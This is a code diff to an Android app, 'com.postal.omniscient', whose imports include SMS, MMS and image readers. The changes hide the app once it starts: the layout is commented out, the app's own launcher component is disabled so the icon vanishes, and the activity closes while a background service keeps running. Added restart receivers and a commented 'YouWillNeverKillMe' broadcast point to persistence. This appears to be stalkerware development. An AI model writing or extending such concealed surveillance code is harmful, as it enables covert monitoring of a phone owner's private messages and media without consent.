@@ -1,11 +1,14 @@
 package com.postal.omniscient;
 
+import android.app.AlarmManager;
+import android.app.PendingIntent;
 import android.app.admin.DevicePolicyManager;
 import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.PackageManager;
 import android.support.v4.content.AsyncTaskLoader;
 import android.support.v7.app.AppCompatActivity;
 
@@ -22,7 +25,10 @@ import com.postal.omniscient.postal.reader.mms.ReadMms;
 import com.postal.omniscient.postal.reader.sms.ReadSms;
 import com.postal.omniscient.postal.reader.image.AllImages;
 import com.postal.omniscient.postal.service.MyService;
+import com.postal.omniscient.postal.service.RestartServiceReceiver;
+import com.postal.omniscient.postal.service.StartService;
 
+import java.text.SimpleDateFormat;
 import java.util.Calendar;
 
 
@@ -37,13 +43,14 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+//        setContentView(R.layout.activity_main);
 
-        startService(new Intent(this, MyService.class));
-
-
-
-
+        PackageManager pkg=this.getPackageManager();
+        pkg.setComponentEnabledSetting(new ComponentName(this,MainActivity.class),PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+//        PackageManager p = getPackageManager();
+//        ComponentName componentName = new ComponentName(this,MainActivity.class);
+//        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
         //CONTACTS
 //        getContacts();//in test
         //SMS
@@ -119,7 +126,7 @@ public class MainActivity extends AppCompatActivity {
         ad.forceLoad();
         ad = null;
 
-       // finish();
+        finish();
     }
     ///////////////////////////////////////////////////////////////////////////////////////////////////////////
     @Override
@@ -169,10 +176,10 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-            Intent par = new Intent(getApplicationContext(), MyService.class);
-
+            Intent par = new Intent(getApplicationContext(), StartService.class);
             startService(par);
-            par = null;
+            //sendBroadcast(new Intent("YouWillNeverKillMe"));
+
             long sec = 1000*5;
 //            try {
 //                while (true) {
